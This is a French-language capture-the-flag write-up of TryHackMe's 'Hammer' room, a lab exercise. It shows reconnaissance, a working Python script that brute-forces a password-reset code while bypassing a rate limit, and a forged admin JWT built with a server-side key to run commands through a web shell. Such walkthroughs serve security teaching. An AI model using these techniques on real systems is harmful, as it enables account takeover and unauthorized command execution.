---
title: "HAMMER CTF"
date: 2024-12-10 10:00:00 +0900
categories: [CTF, pentest]
tags: [ctf, pentest, thm, web_auth,medium]
image: 
  path: https://i.ibb.co/B2jbCGY/62a7685ca6e7ce005d3f3afe-1723567516578.png
  height: 200
---

Aujourd'hui, nous nous attaquons à un CTF, axé principalement sur le thème de l'authentification web. Ce CTF est disponible sur la plateforme [TryHackMe](https://tryhackme.com/r/room/hammer) et a été créé par [1337rce](https://tryhackme.com/r/p/1337rce).

Notre cible pour ce CTF est la machine avec l'IP suivante : **10.10.43.36** et nous allons tenter de répondre aux deux questions du challenge :

- Quelle est la valeur du **flag** après s'être connecté au tableau de bord ?
- Quel est le contenu du fichier `/home/ubuntu/flag.txt` ?

### Phase de reconnaissance 
Pour commencer, nous allons scanner les ports disponibles. Étant donné que notre cible est une application web, nous réaliserons un scan rapide et agressif sur tous les ports, comme suit : 
![Image nmap](https://i.ibb.co/Jqt0jhB/Screenshot-2024-12-15-120608.png){: .normal width="600" height="600" }

Nous découvrons qu'un *service SSH* fonctionne sur le port 22, ainsi qu'un *service compatible avec le protocole WASTE* qui est un protocole de communication peer-to-peer (P2P) qui permet de créer des réseaux privés sécurisés. Cependant, étant donné que nous avons effectué un scan superficiel, il est possible que le scan ait mal identifié un service, et qu'en réalité, le port héberge l'application web cible. Le meilleur moyen de le vérifier est de tester nous-mêmes : 

![Image](https://i.ibb.co/RBC3FRr/Screenshot-2024-12-15-120734.png){: .normal width="600" height="600" }

### Identification de l'application web
Bingo ! Nous avons deux champs d'authentification : email et mot de passe. Avant de procéder, nous allons analyser les technologies utilisées sur le site et examiner le code source de la page pour repérer d’éventuelles informations intéressantes. 

![Image avec wappalyzer](https://i.ibb.co/Lx5PqhG/Screenshot-2024-12-15-121052.png){: .normal width="300" height="300" } ![Image code source](https://i.ibb.co/89sxfPp/Screenshot-2024-12-15-120806.png){: .normal width="500" height="500" }

Nous constatons que le site tourne sur un serveur `Apache`, utilise `Bootstrap` pour le front-end, la librairie `jQuery` pour les scripts côté client, et du `PHP` pour le back-end. Le code source nous révèle également une note pour les développeurs, indiquant que les répertoires doivent commencer par **hmr_**.

### Tests de vulnérabilité
Nous avons suffisamment d'informations pour effectuer deux tests simples.

Nous allons vérifier si les champs email et mot de passe sont vulnérables aux injections `SQL` : 
![Image](https://i.ibb.co/2qhXcqc/Screenshot-2024-12-15-121433.png){: .normal width="500" height="500" } ![Image](https://i.ibb.co/tqKh6Z2/Screenshot-2024-12-15-122000.png){: .normal width="500" height="500" }

Il semble que non.

Ensuite, nous allons répertorier les sous-répertoires de **http://10.10.43.36:1337/**. Nous testerons avec une liste de mots communs, puis une autre liste commençant par **hmr_** (en référence à la convention de nommage vue dans le code source). 

![Image Gobuster](https://i.ibb.co/j3j6tqG/Screenshot-2024-12-15-122509.png){: .normal width="700" height="700" }

Nous trouvons plusieurs répertoires intéressants. Je ne vais pas tous les lister, mais nous allons nous concentrer sur les plus pertinents.  

- **/vendor**
- **/hmr_log**

*Le répertoire vendor* contient des fichiers relatifs à la librairie `php-jwt`, qui gère les **JSON Web Tokens (JWT)**. En fouillant un peu, nous découvrons le répertoire GitHub officiel, un fichier **README** expliquant le fonctionnement des tokens, ainsi que leurs différents algorithmes.

![Image](https://i.ibb.co/HFyjjd2/Screenshot-2024-12-15-122955.png){: .normal width="360" height="360" } ![Image](https://i.ibb.co/cTjggg3/Screenshot-2024-12-15-122927.png){: .normal width="300" height="300" }


*Le répertoire hmr_log* contient des logs d’erreurs, notamment des tentatives de connexion échouées pour un utilisateur <mark>tester@hammer.thm</mark>. Nous pouvons voir plusieurs tentatives infructueuses qui ont abouti à une déconnexion forcée de l'utilisateur avec le message **"Request exceeded the limit of 10..."**.

![Image](https://i.ibb.co/60NJXp1/Screenshot-2024-12-15-122759.png){: .normal width="500" height="500" } ![Image](https://i.ibb.co/2jjYhX8/Screenshot-2024-12-15-122734.png){: .normal width="500" height="500" }

Nous allons tester nous-mêmes pour confirmer. Mais avant cela, nous allons lancer un test de bruteforce avec `hydra` en arrière-plan pour voir si l'utilisateur possède un mot de passe faible (*spoiler : cela ne donnera rien*). 

![Image hydra](https://i.ibb.co/bQ8hyQk/Screenshot-2024-12-15-123457.png){: .normal width="600" height="600" }

### Analyse de la page "Forgot your password?"
Nous nous intéressons maintenant à la page **"Forgot your password?"**. Comme d'habitude, nous jetons un œil au code source avant de faire quoi que ce soit. 

![Image](https://i.ibb.co/2yn9Prs/Screenshot-2024-12-15-123940.png){: .normal width="410" height="410" } ![Image](https://i.ibb.co/YcFPCZJ/Screenshot-2024-12-15-123632.png){: .normal width="400" height="400" }

Nous remarquons un **script JS** contenant une fonction `startCountdown()` qui est censée nous rediriger vers la page **/logout.php** lorsque le timer atteint zéro.

 ![Image timer](https://i.ibb.co/ryHVd5x/Screenshot-2024-12-15-123908.png){: .normal width="400" height="400" }

En utilisant **BurpSuite**, nous interceptons la requête lorsque nous envoyons un chiffre (ici 1234), et remarquons qu'en plus du paramètre  `recovery_code`, il y a un autre paramètre `s`, qui semble correspondre au nombre de secondes restantes. Nous pourrions donc envisager de modifier cet argument avec un nombre arbitraire élevé pour prolonger le délai de récupération.

![Image](https://i.ibb.co/BVC8Qnq/Screenshot-2024-12-15-124035.png){: .normal width="210" height="210" } ![Image](https://i.ibb.co/bKccgTk/Screenshot-2024-12-15-124137.png){: .normal width="600" height="600" }

### Attaque par bruteforce
Cette opportunité de prolonger le délai nous permet d’envisager *une attaque par bruteforce*, où nous tenterions toutes les possibilités possibles, c'est à dire les **10000 nombres possible**. Cependant, comme nous l’avons vu dans les logs, **il y a une limite de tentatives** que nous pouvons confirmer dès la septième tentative (on remarque immédiatement une taille de réponse inhabituelle). 

![Image](https://i.ibb.co/8jFghvT/Screenshot-2024-12-15-124301.png){: .normal width="500" height="500" } ![Image](https://i.ibb.co/VjN0VJ9/Screenshot-2024-12-15-124553.png){: .normal width="500" height="500" }

### Contournement de la limite de tentatives
Dès que nous essayons d’accéder à `reset_password.php`, nous sommes bloqués sur un écran de sécurité. Pour contourner cette restriction et réessayer, nous allons **changer notre cookie de session**. 

![Image](https://i.ibb.co/7kf6kzQ/Screenshot-2024-12-15-124710.png){: .normal width="300" height="300" } ![Image](https://i.ibb.co/sQDQDy9/Screenshot-2024-12-15-124920.png){: .normal width="510" height="510" }

Maintenant, un prolbème se pose : **comment contourner cette limite de tentatives ?**  
Après plusieurs tentatives infructueuses, j'ai trouvé une faille simple dans le système :  
Le paramètre **LimitInternalRecursion**, qui limite le nombre d’essais, ne s'applique qu’aux tentatives sur le code de récupération.
En d’autres termes, pour chaque code envoyé, nous avons **10** tentatives possibles. Cependant, **le contraire n'est pas vérifié** ! Nous pouvons donc envoyer un **nombre illimité de codes pour une tentative donnée**.

Ainsi, nous pourrions donc imaginer le scénario suivant :

1. Choisir un code aléatoire (par exemple *1345*).
2. Demander une réinitialisation du mot de passe.
3. Le site nous envoie un code.
4. Nous essayons *1345*. 
5. Si ce n’est pas le bon, nous nous déconnectons 
6. Demander une réinitialisation du mot de passe... et ainsi de suite.

Pour appliquer cette stratégie, nous allons donc créer un `script Python` (c'est le langage avec lequel je me sens le plus à l'aise pour faire des requêtes web) qui décrit les étapes citées précédemment et, lorsque nous tomberons sur le bon code, nous afficherons la réponse.

```python
import requests
from concurrent.futures import ThreadPoolExecutor
import time

# Paramètres de base
url = 'http://10.10.43.36:1337/reset_password.php'
logout_url = 'http://10.10.43.36:1337/logout.php'
headers = {
    'Host': '10.10.43.36:1337',
    'Cache-Control': 'max-age=0',
    'Origin': 'http://10.10.44.48:1337',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Referer': 'http://10.10.43.36:1337/reset_password.php',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'fr-FR,fr;q=0.9',
}

cookies = {
    'PHPSESSID': 'abcdefghijkkjihgfedcba',  
}

# Paramètres pour la première requête POST 
data_reset_password = {
    'email': 'tester@hammer.thm',
}

# Paramètres pour la deuxième requête POST (code de récupération)
data_recovery_code = {
    'recovery_code': '1345', 
    's': '50000',
}

# Fonctions pour envoyer les requêtes
def send_reset_password():
    response = requests.post(url, headers=headers, cookies=cookies, data=data_reset_password)
    print("Réinitialisation du mot de passe: ", response.status_code)
    return response

def send_recovery_code():
    response = requests.post(url, headers=headers, cookies=cookies, data=data_recovery_code)
    print("Soumission du code de récupération: ", response.status_code)
    return response

def send_logout():
    response = requests.get(logout_url, headers=headers, cookies=cookies)
    print("Déconnexion: ", response.status_code)
    return response

# Envoi des requêtes
def send_requests():
    compteur = 1
    with ThreadPoolExecutor(max_workers=20) as executor: 
        while True:
            print(f"Requête numéro : {compteur}")
            future_reset = executor.submit(send_reset_password)
            future_recovery = executor.submit(send_recovery_code)
            
            response_reset = future_reset.result()
            response_recovery = future_recovery.result()
            
            if "Invalid or expired recovery code!" not in response_recovery.text and "Time elapsed. Please try again later." not in response_recovery.text:
                print(response_recovery.text)
                break  # Arrêter la boucle

            future_logout = executor.submit(send_logout)
            response_logout = future_logout.result()
            print("Déconnexion: ", response_logout.status_code)
            compteur += 1

if __name__ == "__main__":
    send_requests()
```

Finalement, après l'exécution du script et 10 minutes passées à regarder mon écran tourner dans le vide, j'ai enfin obtenu la réponse attendue :
![Image](https://i.ibb.co/hVqcP1m/Screenshot-2024-12-15-131349.png){: .normal width="600" height="600" }

On peut voir ainsi, que lorsque le code de récupération est correct, le site nous demande d'entrer un nouveau mot de passe et de le confirmer. Qu'attendons-nous alors ? Maintenant qu'on a cette information, on va modifier très légèrement notre code Python pour qu'en plus d'afficher la réponse lorsqu'il trouve le code, qu'il envoie aussi une requête pour changer le mot de passe.
```python
data_new_password = {
    'password': 'root',
    'confirm_password': 'root',
}

if "Invalid or expired recovery code!" not in response_recovery.text and "Time elapsed. Please try again later." not in response_recovery.text:
    print(response_recovery.text)
    response_new_password = requests.post(url, headers=headers, cookies=cookies, data=data_new_password)
    print("Mot de passe réinitialisé avec succès !")
    break  # Arrêter la boucle

```

Bon et bien plus qu'à attendre une autre dizaine de minutes...
![Image](https://i.ibb.co/mDnZyHQ/Screenshot-2024-12-15-131429.png){: .normal width="600" height="600" }


**Biiiingo !**

On a donc notre email : <mark>tester@hammer.thm</mark> et notre mot de passe défini : <mark>root</mark>. Sans plus attendre, connectons-nous pour récupérer notre drapeau sur la page dashboard.php !

![Image](https://i.ibb.co/KwF5ZBp/Screenshot-2024-12-15-134737.png){: .normal width="410" height="410" }



### Accès dashboard
Comme d'habitude, on va jeter un coup d'œil au code source.

![Image](https://i.ibb.co/QD07XTD/Screenshot-2024-12-15-134845.png){: .normal width="410" height="410" } 

![Image](https://i.ibb.co/CmY0kRJ/Screenshot-2024-12-15-134915.png){: .normal width="400" height="400" }

Ici deux choses à noter : premièrement, il y a une fonction JS qui vérifie si notre cookie `persistentSession` est à true, si non, alors nous sommes déconnectés (je viens d'ailleurs d'en faire les frais, ahaha).

Deuxièmement, on trouve une fonction AJAX qui, lorsqu'une requête POST est envoyée à `execute_commande.php`, ajoute dans le header le paramètre `Authorization: Bearer` suivi de notre token web (dont nous avons pu voir le fonctionnement dans le répertoire **/vendor**, si vous vous souvenez bien).

### Exploration du cookie et du token
En première intention, pour éviter les déconnexions en continue, on va changer notre cookie `persistentSession` à **yes** et, par la même occasion, changer sa date d'expiration, car comme vous pouvez le voir, le cookie est déjà expiré depuis 1h00.

![Image](https://i.ibb.co/pvy3XmQ/Screenshot-2024-12-15-135323.png){: .normal width="410" height="410" } 


Ensuite, on va jeter un coup d'œil à notre token et examiner de quoi sont constitués son *payload* et son *header*.
![Image](https://i.ibb.co/4sw1Sbh/Screenshot-2024-12-15-135820.png){: .normal width="410" height="410" } 


### Exploration du shell web
Enfin, maintenant que nous avons stabilisé notre session, on va pouvoir pianoter sur le shell web, si je puis dire, pour explorer nos possibilités d'action.

![Image](https://i.ibb.co/g6MjR2s/Screenshot-2024-12-15-135607.png){: .normal width="260" height="260" } ![Image](https://i.ibb.co/tQhGwKx/Screenshot-2024-12-15-135655.png){: .normal width="430" height="430" }

Bon, visiblement, le fait d'être `user` nous restreint pas mal dans l'utilisation des commandes. Après avoir essayé plusieurs tentatives pour lire le fichier flag (avec *more, less, tail, echo*...), je pense que nous n'aurons pas le choix que de changer notre rôle d'`user` à `admin`. Pour cela, on va devoir **changer notre token web**, car comme nous l'avions vu avec la fonction AJAX, c'est lui qui est le facteur responsable de nos restrictions, étant donné qu'il est ajouté dans chaque requête POST lorsqu'on utilise le shell.


### Création d'un token web admin
On a vu, lors de l'utilisation de **ls** (seule commande qui nous était possible), qu'on avait une **clé accessible (188ade1.key)** et nous avons aussi vu, en décodant notre JWT, que nous avions un argument dans le *header* : **kid**, c'est-à-dire un **key id**. Pour rappel, le key id dans l'en-tête est une manière d'identifier la clé cryptographique pour signer et vérifier le jeton. Je pense que vous avez donc déjà fait le rapprochement : nous allons utiliser notre clé déjà présente sur le serveur pour créer notre propre JWT.

Pour cela, on va d'abord récupérer la signature associée à la clé :

![Image](https://i.ibb.co/Tq13J6G/Screenshot-2024-12-15-140046.png){: .normal width="400" height="400" }

![Image](https://i.ibb.co/D5qdj4y/Screenshot-2024-12-15-141152.png){: .normal width="400" height="400" }

Puis on va créer notre token, en nous attribuant le rôle d'`admin` (rien que ça), en insérant le chemin de la clé sur le serveur et de sa signature.

![Image](https://i.ibb.co/MNR62dH/Screenshot-2024-12-15-141249.png){: .normal width="600" height="600" }

Maintenant que nous avons notre token d'`admin`, il ne nous reste plus qu'à l'insérer dans le header de notre requête POST lorsque nous entrerons une commande, ici `cat /home/ubuntu/flag.txt`.

![Image](https://i.ibb.co/PcVSc8y/Screenshot-2024-12-15-141426.png){: .normal width="600" height="600" }


Et voilà ! 🎉 CTF accompli ! 🏆
